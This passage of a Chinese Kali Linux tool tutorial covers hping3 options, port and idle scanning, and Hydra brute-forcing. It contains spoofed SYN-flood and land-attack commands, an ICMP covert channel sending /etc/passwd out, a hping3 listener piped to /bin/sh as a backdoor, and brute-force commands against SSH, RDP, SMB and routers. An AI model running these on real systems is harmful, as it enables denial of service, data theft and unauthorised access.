class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">hping3</span> host<span class="hljs-meta"> [options]</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">-h–<span class="hljs-built_in">help</span>显示帮助<br>-v–version显示版本<br>-c–count发送数据包的数目<br>-i–interval发送数据包间隔的时间 (uX即X微秒, 例如： -i u1000)<br>–fast等同 -i u10000 (每秒10个包)<br>–faster等同 -i u1000 (每秒100个包)<br>–flood尽最快发送数据包，不显示回复。<br>-n–numeric数字化输出，象征性输出主机地址。<br>-q–quiet安静模式<br>-I–interface网卡接口 (默认路由接口)<br>-V–verbose详细模式<br>-D–debug调试信息<br>-z–<span class="hljs-built_in">bind</span>绑定ctrl+z到ttl(默认为目的端口)<br>-Z–unbind取消绑定ctrl+z键<br>–beep对于接收到的每个匹配数据包蜂鸣声提示<br></code></pre></td></tr></table></figure><h3 id="3-模式选择"><a href="#3-模式选择" class="headerlink" title="3.模式选择"></a>3.模式选择</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">编号模式描述<br>default modeTCP默认模式是 TCP<br>-0 或 --rawipRAWIP模式，原始IP模式在此模式下HPING会发送带数据的IP头。即裸IP方式。使用RAWSOCKET方式。<br>-1 或 --icmpICMP模式此模式下HPING会发送IGMP应答报，你可以用–ICMPTYPE --ICMPCODE选项发送其他类型/模式的ICMP报文。<br>-2 或 --udpUDP 模式缺省下，HPING会发送UDP报文到主机的0端口，你可以用–baseport --destport --keep选项指定其模式。<br>-8 或 --scanSCAN mode扫描模式 指定扫描对应的端口。Example: hping --scan 1-30,70-90 -S www.target.host // 扫描<br>-9 或 --listenlisten mode监听模式<br></code></pre></td></tr></table></figure><h3 id="4-IP-模式"><a href="#4-IP-模式" class="headerlink" title="4. IP 模式"></a>4. IP 模式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">参数缩写参数描述<br>-a–spoofspoof <span class="hljs-built_in">source</span> address //源地址欺骗。伪造IP攻击，防火墙就不会记录你的真实IP了，当然回应的包你也接收不到了。<br>–rand-destrandom destionation address mode. see the man. // 随机目的地址模式。详细使用 man 命令<br>–rand-sourcerandom <span class="hljs-built_in">source</span> address mode. see the man. // 随机源地址模式。详细使用 man 命令<br>-t–ttlttl (默认 64) //修改 ttl 值<br>-N–<span class="hljs-built_in">id</span><span class="hljs-built_in">id</span> (默认 随机) // hping 中的 ID 值，缺省为随机值<br>-W–winid使用win* <span class="hljs-built_in">id</span>字节顺序 //使用winid模式，针对不同的操作系统。UNIX ,WINDIWS的<span class="hljs-built_in">id</span>回应不同的，这选项可以让你的ID回应和WINDOWS一样。<br>-r–rel相对<span class="hljs-built_in">id</span>字段(估计主机流量) //更改ID的，可以让ID曾递减输出，详见HPING-HOWTO。<br>-f–frag拆分数据包更多的frag. (may pass weak acl) //分段，可以测试对方或者交换机碎片处理能力，缺省16字节。<br>-x–morefrag设置更多的分段标志 // 大量碎片，泪滴攻击。<br>-y–dontfrag设置不分段标志 // 发送不可恢复的IP碎片，这可以让你了解更多的MTU PATH DISCOVERY。<br>-g–fragoff<span class="hljs-built_in">set</span> the fragment offset // 设置断偏移。<br>-m–mtu设置虚拟最大传输单元, implies --frag <span class="hljs-keyword">if</span> packet size &gt; mtu // 设置虚拟MTU值，当大于mtu的时候分段。<br>-o–tos<span class="hljs-built_in">type</span> of service (default 0x00), try --tos <span class="hljs-built_in">help</span> // tos字段，缺省0x00，尽力而为？<br>-G–rrouteincludes RECORD_ROUTE option and display the route buffer // 记录IP路由，并显示路由缓冲。<br>–lsrr松散源路由并记录路由 // 松散源路由<br>–ssrr严格源路由并记录路由 // 严格源路由<br>-H–ipproto设置IP协议字段，仅在RAW IP模式下使用 //在RAW IP模式里选择IP协议。设置ip协议域，仅在RAW ip模式使用。<br></code></pre></td></tr></table></figure><h3 id="5-ICMP-模式"><a href="#5-ICMP-模式" class="headerlink" title="5. ICMP 模式"></a>5. ICMP 模式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">参数缩写参数描述<br>-C–icmptypeicmp类型(默认<span class="hljs-built_in">echo</span>请求) // ICMP类型，缺省回显请求。<br>-K–icmpcodeicmp代号(默认0) // ICMP代码。<br>–force-icmp发送所有icmp类型(默认仅发送支持的类型) // 强制ICMP类型。<br>–icmp-gw设置ICMP重定向网关地址(默认0.0.0.0) // ICMP重定向<br>–icmp-ts等同 --icmp --icmptype 13 (ICMP 时间戳) // icmp时间戳<br>–icmp-addr等同 --icmp --icmptype 17 (ICMP 地址子网掩码) // icmp子网地址<br>–icmp-help显示其他icmp选项帮助 // ICMP帮助<br></code></pre></td></tr></table></figure><h3 id="6-UDP-x2F-TCP-模式"><a href="#6-UDP-x2F-TCP-模式" class="headerlink" title="6. UDP&#x2F;TCP 模式"></a>6. UDP&#x2F;TCP 模式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs bash">参数缩写参数描述<br>-s–baseportbase <span class="hljs-built_in">source</span> port (default random) // 缺省随机源端口<br>-p–destport[+][+] destination port(default 0) ctrl+z inc/dec // 缺省随机源端口<br>-k–keepkeep still <span class="hljs-built_in">source</span> port // 保持源端口<br>-w–winwinsize (default 64) // win的滑动窗口。windows发送字节(默认64)<br>-O–tcpoff<span class="hljs-built_in">set</span> fake tcp data offset (instead of tcphdrlen / 4) // 设置伪造tcp数据偏移量(取代tcp地址长度除4)<br>-Q–seqnumshows only tcp sequence number // 仅显示tcp序列号<br>-b–badcksum(尝试)发送具有错误IP校验和数据包。许多系统将修复发送数据包的IP校验和。所以你会得到错误UDP/TCP校验和。<br>-M–setseq设置TCP序列号<br>-L–setack设置TCP的ack ------------------------------------- (不是 TCP 的 ACK 标志位)<br>-F–fin<span class="hljs-built_in">set</span> FIN flag<br>-S–syn<span class="hljs-built_in">set</span> SYN flag<br>-R–rst<span class="hljs-built_in">set</span> RST flag<br>-P–push<span class="hljs-built_in">set</span> PUSH flag<br>-A–ack<span class="hljs-built_in">set</span> ACK flag ------------------------------------- （设置 TCP 的 ACK 标志 位）<br>-U–urg<span class="hljs-built_in">set</span> URG flag // 一大堆IP抱头的设置。<br>-X–xmas<span class="hljs-built_in">set</span> X unused flag (0x40)<br>-Y–ymas<span class="hljs-built_in">set</span> Y unused flag (0x80)<br>–tcpexitcode使用last tcp-&gt; th_flags作为退出码<br>–tcp-mss启用具有给定值的TCP MSS选项<br>–tcp-timestamp启用TCP时间戳选项来猜测HZ/uptime<br></code></pre></td></tr></table></figure><h3 id="7-Common-x2F-x2F-通用设置"><a href="#7-Common-x2F-x2F-通用设置" class="headerlink" title="7.Common &#x2F;&#x2F;通用设置"></a>7.Common &#x2F;&#x2F;通用设置</h3><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs fortran">参数缩写参数描述<br>-d–<span class="hljs-keyword">data</span><span class="hljs-keyword">data</span> <span class="hljs-built_in">size</span> (<span class="hljs-keyword">default</span> is <span class="hljs-number">0</span>) // 发送数据包大小，缺省是<span class="hljs-number">0</span>。<br>-E–<span class="hljs-keyword">file</span>文件数据<br>-e–<span class="hljs-built_in">sign</span>添加“签名”<br>-j–dump转储为十六进制数据包<br>-J–<span class="hljs-built_in">print</span>转储为可打印字符<br>-B–safe启用“安全”协议<br>-u–<span class="hljs-keyword">end</span>告诉你什么时候–<span class="hljs-keyword">file</span>达到EOF并防止倒回<br>-T–traceroutetraceroute模式(等同使用 --<span class="hljs-keyword">bind</span> 且–ttl <span class="hljs-number">1</span>)<br>–tr-<span class="hljs-keyword">stop</span>在traceroute模式下收到第一个不是ICMP时退出<br>–tr-keep-ttl保持源TTL固定，仅用于监视一跳<br>–tr-no-rtt不要在跟踪路由模式下计算/显示RTT信息 ARS包描述（新增功能，不稳定）ARS packet description (new, unstable)<br>–apd-send发送APD描述数据包(参见docs / APD.txt)<br></code></pre></td></tr></table></figure><h3 id="8-Hping3-功能"><a href="#8-Hping3-功能" class="headerlink" title="8. Hping3 功能"></a>8. Hping3 功能</h3><h4 id="8-1-防火墙测试"><a href="#8-1-防火墙测试" class="headerlink" title="8.1 防火墙测试"></a>8.1 防火墙测试</h4><p>使用Hping3指定各种数据包字段，依次对防火墙进行详细测试。请参考：<a href="http://0daysecurity.com/articles/hping3_examples.html">http://0daysecurity.com/articles/hping3_examples.html</a></p><p>测试防火墙对ICMP包的反应、是否支持traceroute、是否开放某个端口、对防火墙进行拒绝服务攻击（DoS attack）。例如，以LandAttack方式测试目标防火墙（Land Attack是将发送源地址设置为与目标地址相同，诱使目标机与自己不停地建立连接）。</p><p>hping3 -S -c 1000000 -a 10.10.10.10 -p 21 10.10.10.10</p><h4 id="8-2-端口扫描"><a href="#8-2-端口扫描" class="headerlink" title="8.2 端口扫描"></a>8.2 端口扫描</h4><p>Hping3也可以对目标端口进行扫描。Hping3支持指定TCP各个标志位、长度等信息。以下示例可用于探测目标机的80端口是否开放：</p><p>hping3 -I eth0 -S 192.168.10.1 -p 80<br>其中-I eth0指定使用eth0端口，-S指定TCP包的标志位SYN，-p 80指定探测的目的端口。</p><p>hping3支持非常丰富的端口探测方式，nmap拥有的扫描方式hping3几乎都支持（除开connect方式，因为Hping3仅发送与接收包，不会维护连接，所以不支持connect方式探测）。而且Hping3能够对发送的探测进行更加精细的控制，方便用户微调探测结果。当然，Hping3的端口扫描性能及综合处理能力，无法与Nmap相比。一般使用它仅对少量主机的少量端口进行扫描。<br><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411230941403.png" alt="image-20220411230941403"></p><h4 id="8-3-Idle扫描"><a href="#8-3-Idle扫描" class="headerlink" title="8.3 Idle扫描"></a>8.3 Idle扫描</h4><p>Idle扫描（Idle Scanning）是一种匿名扫描远程主机的方式，该方式也是有Hping3的作者Salvatore Sanfilippo发明的，目前Idle扫描在Nmap中也有实现。</p><p>该扫描原理是：寻找一台idle主机（该主机没有任何的网络流量，并且IPID是逐个增长的），攻击端主机先向idle主机发送探测包，从回复包中获取其IPID。冒充idle主机的IP地址向远程主机的端口发送SYN包（此处假设为SYN包），此时如果远程主机的目的端口开放，那么会回复SYN&#x2F;ACK，此时idle主机收到SYN&#x2F;ACK后回复RST包。然后攻击端主机再向idle主机发送探测包，获取其IPID。那么对比两次的IPID值，我们就可以判断远程主机是否回复了数据包，从而间接地推测其端口状态。</p><h4 id="8-4-拒绝服务攻击"><a href="#8-4-拒绝服务攻击" class="headerlink" title="8.4 拒绝服务攻击"></a>8.4 拒绝服务攻击</h4><p>使用Hping3可以很方便构建拒绝服务攻击。比如对目标机发起大量SYN连接，伪造源地址为192.168.10.99，并使用1000微秒的间隔发送各个SYN包。</p><p>hping3 -I eth0 -a192.168.10.99 -S 192.168.10.33 -p 80 -i u1000<br>其他攻击如smurf、teardrop、land attack等也很容易构建出来。</p><h4 id="8-5-文件传输"><a href="#8-5-文件传输" class="headerlink" title="8.5 文件传输"></a>8.5 文件传输</h4><p>Hping3支持通过TCP&#x2F;UDP&#x2F;ICMP等包来进行文件传输。相当于借助TCP&#x2F;UDP&#x2F;ICMP包建立隐秘隧道通讯。实现方式是开启监听端口，对检测到的签名（签名为用户指定的字符串）的内容进行相应的解析。在接收端开启服务：</p><p>hping3 192.168.1.159–listen signature –safe –icmp<br>监听ICMP包中的签名，根据签名解析出文件内容。</p><p>在发送端使用签名打包的ICMP包发送文件：</p><p>hping3 192.168.1.108–icmp ?d 100 –sign signature –file &#x2F;etc&#x2F;passwd<br>将&#x2F;etc&#x2F;passwd密码文件通过ICMP包传给192.168.10.44主机。发送包大小为100字节（-d 100），发送签名为signature(-sign signature)。</p><h4 id="8-6-木马功能"><a href="#8-6-木马功能" class="headerlink" title="8.6 木马功能"></a>8.6 木马功能</h4><p>如果Hping3能够在远程主机上启动，那么可以作为木马程序启动监听端口，并在建立连接后打开shell通信。与netcat的后门功能类似。</p><p>示例：本地打开53号UDP端口（DNS解析服务）监听来自192.168.10.66主机的包含签名为signature的数据包，并将收到的数据调用&#x2F;bin&#x2F;sh执行。</p><p>在木马启动端：</p><p>hping3 192.168.10.66–listen signature –safe –udp -p 53 | &#x2F;bin&#x2F;sh<br>在远程控制端：</p><p>echo ls &gt;test.cmd<br>hping3 192.168.10.44 -p53 -d 100 –udp –sign siganature –file .&#x2F;test.cmd<br>将包含ls命令的文件加上签名signature发送到192.168.10.44主机的53号UDP端口，包数据长度为100字节。</p><h3 id="9-端口扫描测试"><a href="#9-端口扫描测试" class="headerlink" title="9. 端口扫描测试"></a>9. 端口扫描测试</h3><p>实验靶机:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">Windows7   IP: 192.168.214.132<br><br>Metasploitable   IP: 192.168.214.133<br></code></pre></td></tr></table></figure><p>在Kali端输入命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo hping3 -I eth0 -S 192.168.214.133 -p 80<br></code></pre></td></tr></table></figure><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411231442454.png" alt="image-20220411231442454"></p><p>说明通信成功,80端口已开启</p><h2 id="hydra"><a href="#hydra" class="headerlink" title="hydra"></a>hydra</h2><h3 id="一、hydra简介"><a href="#一、hydra简介" class="headerlink" title="一、hydra简介"></a>一、hydra简介</h3><p>Hydra是一款非常强大的暴力破解工具，它是由著名的黑客组织THC开发的一款开源暴力破解工具。Hydra是一个验证性质的工具，主要目的是：<strong>展示安全研究人员从远程获取一个系统认证权限。</strong></p><p>目前该工具支持以下协议的爆破：</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">AFP</span>，Cisco AAA，Cisco身份验证，Cisco启用，CVS，Firebird，FTP，HTTP-FORM-<span class="hljs-meta">GET</span>，HTTP-FORM-POST，HTTP-<span class="hljs-meta">GET</span>，HTTP-HEAD，HTTP-PROXY，HTTPS-FORM- <span class="hljs-meta">GET</span>，HTTPS-FORM-POST，HTTPS-<span class="hljs-meta">GET</span>，HTTPS-HEAD，HTTP-Proxy，ICQ，IMAP，IRC，LDAP，MS-SQL，MYSQL，NCP，NNTP，Oracle Listener，Oracle SID，Oracle，<span class="hljs-built_in">PC</span>-Anywhere， PCNFS，POP3，POSTGRES，RDP，Rexec，Rlogin，Rsh，SAP / <span class="hljs-built_in">R3</span>，SIP，SMB，SMTP，SMTP枚举，SNMP，SOCKS5，SSH（<span class="hljs-built_in">v1</span>和<span class="hljs-built_in">v2</span>），Subversion，Teamspeak（TS2），Telnet，VMware-Auth ，VNC和XMPP。<br>对于 HTTP，POP3，IMAP和SMTP，支持几种登录机制，如普通和MD5摘要等<br></code></pre></td></tr></table></figure><h3 id="二、hydra使用方法"><a href="#二、hydra使用方法" class="headerlink" title="二、hydra使用方法"></a>二、hydra使用方法</h3><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">语法：Hydra 参数 <span class="hljs-built_in">IP</span> 服务<br></code></pre></td></tr></table></figure><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">参数：<br>-l login 小写，指定用户名进行破解<br>-L file 大写，指定用户的用户名字典<br>-p pass 小写，用于指定密码破解，很少使用，一般采用密码字典。<br>-P file 大写，用于指定密码字典。<br>-e ns 额外的选项，n：空密码试探，s：使用指定账户和密码试探<br>-M file 指定目标ip列表文件，批量破解。<br>-o file 指定结果输出文件<br>-f 找到第一对登录名或者密码的时候中止破解。<br>-t tasks 同时运行的线程数，默认是16<br>-w time 设置最大超时时间，单位<br>-v / -V 显示详细过程<br>-R 恢复爆破（如果破解中断了，下次执行 hydra -R /path/to/hydra.restore 就可以继续任务。）<br>-x 自定义密码。<br></code></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">service：指定服务名，支持的服务跟协议有：telnet，<span class="hljs-keyword">ftp</span>，pop3等等。<br>注意：<br><span class="hljs-number">1.</span>自己创建字典,然后放在当前的目录下或者指定目录。<br><span class="hljs-number">2.</span>参数可以统一放在最后，格式比如hydra ip 服务 参数。<br><span class="hljs-number">3.</span>如果能确定用户名一项时候，比如web登录破解，直接用 -l就可以，然后剩余时间破解密码。<br><span class="hljs-number">4.</span>缺点，如果目标网站登录时候需要验证码就无法破解。<br><span class="hljs-number">5.</span>man hydra最万能。<br><span class="hljs-number">6.</span>或者hydra -U <span class="hljs-keyword">http</span>-form等查看具体帮助。<br></code></pre></td></tr></table></figure><h3 id="三、案例分析"><a href="#三、案例分析" class="headerlink" title="三、案例分析"></a>三、案例分析</h3><p><strong>暴破ssh登录密码</strong></p><p><strong>环境介绍</strong></p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dns">攻击机：kali<br>装有hydra工具<br>靶机：<span class="hljs-number">192.168.154.131</span><br>安装ssh服务，正常运行<br></code></pre></td></tr></table></figure><p>为了测试方便，我们创建两个简单的字典文件，如下：</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411232113611.png" alt="image-20220411232113611"></p><p><strong>开始爆破</strong></p><p>根据命令参数，组织参数格式如下：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">root@kali:/mnt# hydra -L user.txt -P password.txt -t 2 -vV -e ns 192.168.154.131 ssh<br></code></pre></td></tr></table></figure><p><strong>破解成功</strong></p><p>因为字典数量比较少，我们可以轻易的破解成功，但是实际情况下，我们可能需要很久。</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411232131187.png" alt="image-20220411232131187"></p><h3 id="三、各种协议破解汇总"><a href="#三、各种协议破解汇总" class="headerlink" title="三、各种协议破解汇总"></a>三、各种协议破解汇总</h3><p><strong>FTP协议破解</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">破解ftp：<br> <br>hydra -L 用户名字典 -P 密码字典 -t 6 -e ns IP地址 -v<br></code></pre></td></tr></table></figure><p><strong>http协议破解</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">get方式提交，破解web登录：<br> <br>hydra -L 用户名字典 -P 密码字典 -t 线程 -v -e ns IP地址 http-get /admin/<br>hydra -L 用户名字典 -P 密码字典 -t 线程 -v -e ns -f IP地址 http-get /admin/index.php<br> <br>post方式提交，破解web登录：<br> <br>hydra -f -l 用户名 -P 密码字典 -V -s 9900 IP地址 http-post-form <span class="hljs-string">&quot;/admin/index.php?action=login:user=USER&amp;pw=PASS:&quot;</span><br> <br> <br><span class="hljs-comment">#/index.php …这个是登录的 url</span><br><span class="hljs-comment">#后门是POST的数据 其中的用户名密码使用 USER PASS 来代替</span><br><span class="hljs-comment">#然后是如果登录出错 会出现的字符 。。。然后开始破解</span><br></code></pre></td></tr></table></figure><p><strong>https协议破解</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">破解https<br> <br>hydra -m /index.php -l 用户名 -P 密码字典.txt IP地址 https<br></code></pre></td></tr></table></figure><p><strong>路由器破解</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">hydra -l admin -x 6:10:1a.~!@#$%^&amp;()-= -t 8 192.168.1.1 http-get /<br>-l admin 为尝试破解的用户名。<br> <br># -x 6:10:1a. 表示枚举的密码由 数字、小写字母和单字符’.&#x27;等等组成，长度为 6 - 10 位。-t 8 表示分 8 个并行任务进行爆破尝试。192.168.1.1 为 Router 地址。http-get 为破解方式（协议）<br></code></pre></td></tr></table></figure><p><strong>http-proxy协议破解</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">破解http-proxy：<br> <br>hydra -l admin -P 字典.txt http-proxy://IP地址<br></code></pre></td></tr></table></figure><p><strong>smb破解</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">破解smb：<br> <br>hydra -l 用户名字典 -P 密码字典 IP地址 smb<br></code></pre></td></tr></table></figure><p><strong>Windows远程桌面</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">破解rdp(windows远程登录)：<br> <br>hydra ip地址 rdp -l administrator -P 密码字典.txt -V<br></code></pre></td></tr></table></figure><p><strong>邮箱pop3</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">破解邮箱pop3：<br> <br>hydra -l 用户名 -P 密码字典.txt my.pop3.mail pop3<br></code></pre></td></tr></table></figure><p><strong>telnet破解</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">hydra ip地址 telnet -l 用户字典.txt -P 密码字典.txt -t 32 -s 23 -e ns -f -V<br></code></pre></td></tr></table></figure><p><strong>语音通讯工具teamspeak</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">hydra -l 用户名字典 -P 密码字典.txt -s 端口号 -vV ip teamspeak<br></code></pre></td></tr></table></figure><p><strong>cisco</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">hydra -P 密码字典 IP地址 cisco<br>hydra -m cloud -P 密码字典 IP地址 cisco-enable<br></code></pre></td></tr></table></figure><h3 id="四、Kali自带密码字典"><a href="#四、Kali自带密码字典" class="headerlink" title="四、Kali自带密码字典"></a>四、Kali自带密码字典</h3><p>暴力破解能成功最重要的条件还是要有一个强大的密码字典！Kali默认自带了一些字典，在 &#x2F;usr&#x2F;share&#x2F;wordlists 目录下</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411232800693.png" alt="image-20220411232800693"></p><p><strong>dirb</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">big.txt #大的字典<br>small.txt #小的字典<br>catala.txt #项目配置字典<br>common.txt #公共字典<br>euskera.txt #数据目录字典<br>extensions_common.txt #常用文件扩展名字典<br>indexes.txt #首页字典<br>mutations_common.txt #备份扩展名<br>spanish.txt #方法名或库目录<br>others #扩展目录，默认用户名等<br>stress #压力测试<br>vulns #漏洞测试<br></code></pre></td></tr></table></figure><p><strong>dirbuster</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">apache-user-enum-** #apache用户枚举<br>directories.jbrofuzz #目录枚举<br>directory-list-1.0.txt #目录列表大，中，小 big，medium，small<br></code></pre></td></tr></table></figure><p><strong>fern-wifi</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">common.txt #公共wifi账户密码<br></code></pre></td></tr></table></figure><p><strong>metasploit</strong></p><p>metasploit下有各种类型的字典</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411232739785.png" alt="image-20220411232739785"></p><p><strong>wfuzz</strong></p><p>模糊测试，各种字典</p><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411232820868.png" alt="image-20220411232820868"></p><h2 id="hydra-gtk"><a href="#hydra-gtk" class="headerlink" title="hydra-gtk"></a>hydra-gtk</h2><p><img src="https://cd-1307445315.cos.ap-nanjing.myqcloud.com/CD%5Cimage-20220411232953618.png" alt="image-20220411232953618"></p><p>hydra开代理进行网页加密破解等</p><h1 id="i"><a href="#i" class="headerlink" title="i"></a>i</h1><h2 id="icat-sleuthkit"><a href="#icat-sleuthkit" class="headerlink" title="icat-sleuthkit"></a>icat-sleuthkit</h2><p>用于恢复文件</p><h2 id="ifind"><a href="#ifind" class="headerlink" title="ifind"></a>ifind</h2><h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述:"></a>描述:</h3><p>查找已分配给定磁盘单元或文件名的<a href="https://so.csdn.net/so/search?q=%E5%85%83%E6%95%B0%E6%8D%AE&spm=1001.2101.3001.7020">元数据</a>结构。<br>  ifind查找具有data_unit分配了数据单元或具有给定文件名的元数据结构。 在某些情况下，任何结构都可以取消分配，这仍然可以找到结果。</p><h3 id="参数：-4"><a href="#参数：-4" class="headerlink" title="参数："></a>参数：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs bash">有几个必需和可选参数。 必须每次指定图像文件名：<br>image [images]<br>要读取的磁盘或分区映像，其格式以“ -i”给出。 如果将图像分为多个段，则可以指定多个图像文件名。 如果仅给出一个图像文件，并且其名称是序列中的第一个图像文件（例如，以<span 